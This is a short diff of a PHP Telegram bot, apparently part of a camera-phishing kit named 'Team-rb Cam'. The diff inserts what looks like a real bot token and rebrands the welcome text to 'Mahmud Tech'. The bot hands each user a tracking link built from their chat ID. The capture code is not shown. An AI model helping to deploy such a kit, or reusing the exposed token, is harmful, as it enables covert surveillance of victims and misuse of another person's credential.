@@ -1,6 +1,6 @@
 <?php
 session_start();
-$token = "https://google.com";
+$token = "6011177364:AAHR3fclU9PzhdBAcGuBKQF8Akrndlmvnb0";
 $domain = "12345678910111213141516";
 
 include 'telegram.php';
@@ -29,7 +29,7 @@ if(!empty($input)){
 	$text = $message->text;
 	
 	$link = '*Your Link:*'.PHP_EOL.'`'.$domain.'/index.php?id='.$chat_id.'`';
-	$welcome = 'Hello '.$user_name.','.PHP_EOL.PHP_EOL.'Welcome to *Team-rb Cam*'.PHP_EOL.'Powered by [Team-rb](https://t.me/rulebreaker13)'.PHP_EOL.PHP_EOL.$link;
+	$welcome = 'Hello '.$user_name.','.PHP_EOL.PHP_EOL.'Welcome to *Mahmud Tech*'.PHP_EOL.'Powered by [Mahmud Tech](https://t.me/selfbdlav20)'.PHP_EOL.PHP_EOL.$link;
     if($text == '/rb'){
 		$telegram->sendMessage($chat_id , $welcome);
 	}else{
